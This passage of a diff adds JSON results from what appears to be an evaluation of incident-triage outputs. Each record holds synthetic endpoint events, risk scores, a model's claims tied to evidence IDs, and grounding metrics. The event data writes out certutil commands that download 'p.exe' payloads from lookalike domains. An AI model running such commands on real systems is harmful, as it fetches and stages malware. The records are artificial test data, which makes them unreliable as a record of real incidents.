+        "unknown_ids": [],
+        "claims_total": 3,
+        "claims_grounded": 3,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0159",
+        "events": [
+          {
+            "id": "E000559",
+            "type": "process_create",
+            "fact": "process certutil.exe (Microsoft Corporation) launched: certutil.exe -urlcache -split -f https://a7f3k2-cdn-update.top/p.exe payload.bin"
+          },
+          {
+            "id": "E000560",
+            "type": "network_connect",
+            "fact": "outbound connection to a7f3k2-cdn-update.top (203.0.113.66:443)"
+          }
+        ],
+        "rule_hits": [
+          "R003",
+          "R007",
+          "R009"
+        ],
+        "ml_probability": 0.7741,
+        "risk_score": 75,
+        "risk_class": "High",
+        "signals": {
+          "remote_download": [
+            "E000559"
+          ],
+          "lolbin": [
+            "E000559"
+          ],
+          "rare_domain": [
+            "E000560"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0159",
+        "hypothesis": "suspicious unsigned or LOLBin artifact",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed LOLBin abuse",
+            "evidence": [
+              "E000559"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000560"
+            ]
+          },
+          {
+            "text": "Observed remote script/payload download",
+            "evidence": [
+              "E000559"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000559",
+          "E000560"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 3,
+        "claims_grounded": 3,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0160",
+        "events": [
+          {
+            "id": "E000561",
+            "type": "process_create",
+            "fact": "process certutil.exe (Microsoft Corporation) launched: certutil.exe -urlcache -split -f https://cloudflare-verify.support/p.exe payload.bin"
+          },
+          {
+            "id": "E000562",
+            "type": "network_connect",
+            "fact": "outbound connection to cloudflare-verify.support (203.0.113.19:443)"
+          }
+        ],
+        "rule_hits": [
+          "R003",
+          "R007",
+          "R009"
+        ],
+        "ml_probability": 0.7741,
+        "risk_score": 75,
+        "risk_class": "High",
+        "signals": {
+          "remote_download": [
+            "E000561"
+          ],
+          "lolbin": [
+            "E000561"
+          ],
+          "rare_domain": [
+            "E000562"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0160",
+        "hypothesis": "suspicious unsigned or LOLBin artifact",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed LOLBin abuse",
+            "evidence": [
+              "E000561"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000562"
+            ]
+          },
+          {
+            "text": "Observed remote script/payload download",
+            "evidence": [
+              "E000561"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000561",
+          "E000562"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 3,
+        "claims_grounded": 3,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0161",
+        "events": [
+          {
+            "id": "E000563",
+            "type": "process_create",
+            "fact": "process certutil.exe (Microsoft Corporation) launched: certutil.exe -urlcache -split -f https://session-refresh-portal.top/p.exe payload.bin"
+          },
+          {
+            "id": "E000564",
+            "type": "network_connect",
+            "fact": "outbound connection to session-refresh-portal.top (203.0.113.19:443)"
+          }
+        ],
+        "rule_hits": [
+          "R003",
+          "R007",
+          "R009"
+        ],
+        "ml_probability": 0.7741,
+        "risk_score": 75,
+        "risk_class": "High",
+        "signals": {
+          "remote_download": [
+            "E000563"
+          ],
+          "lolbin": [
+            "E000563"
+          ],
+          "rare_domain": [
+            "E000564"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0161",
+        "hypothesis": "suspicious unsigned or LOLBin artifact",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed LOLBin abuse",
+            "evidence": [
+              "E000563"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000564"
+            ]
+          },
+          {
+            "text": "Observed remote script/payload download",
+            "evidence": [
+              "E000563"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000563",
+          "E000564"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 3,
+        "claims_grounded": 3,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    },
+    {
+      "incident": {
+        "incident_id": "INC-0162",
+        "events": [
+          {
+            "id": "E000565",
+            "type": "process_create",
+            "fact": "process certutil.exe (Microsoft Corporation) launched: certutil.exe -urlcache -split -f https://session-refresh-portal.top/p.exe payload.bin"
+          },
+          {
+            "id": "E000566",
+            "type": "network_connect",
+            "fact": "outbound connection to session-refresh-portal.top (203.0.113.19:443)"
+          }
+        ],
+        "rule_hits": [
+          "R003",
+          "R007",
+          "R009"
+        ],
+        "ml_probability": 0.7741,
+        "risk_score": 75,
+        "risk_class": "High",
+        "signals": {
+          "remote_download": [
+            "E000565"
+          ],
+          "lolbin": [
+            "E000565"
+          ],
+          "rare_domain": [
+            "E000566"
+          ]
+        }
+      },
+      "output": {
+        "incident_id": "INC-0162",
+        "hypothesis": "suspicious unsigned or LOLBin artifact",
+        "confidence": "high",
+        "claims": [
+          {
+            "text": "Observed LOLBin abuse",
+            "evidence": [
+              "E000565"
+            ]
+          },
+          {
+            "text": "Observed contact with a rare/unusual destination",
+            "evidence": [
+              "E000566"
+            ]
+          },
+          {
+            "text": "Observed remote script/payload download",
+            "evidence": [
+              "E000565"
+            ]
+          }
+        ],
+        "supporting_evidence": [
+          "E000565",
+          "E000566"
+        ],
+        "contradicting_evidence": [],
+        "recommended_action": "quarantine",
+        "unsupported_claims": []
+      },
+      "grounding": {
+        "valid": true,
+        "passes": true,
+        "schema_valid": true,
+        "schema_errors": [],
+        "unknown_ids": [],
+        "claims_total": 3,
+        "claims_grounded": 3,
+        "grounding_rate": 1.0,
+        "hallucination_rate": 0.0,
+        "unsupported_claims": [],
+        "concealed_unsupported": []
+      }
+    }
+  ]
+}
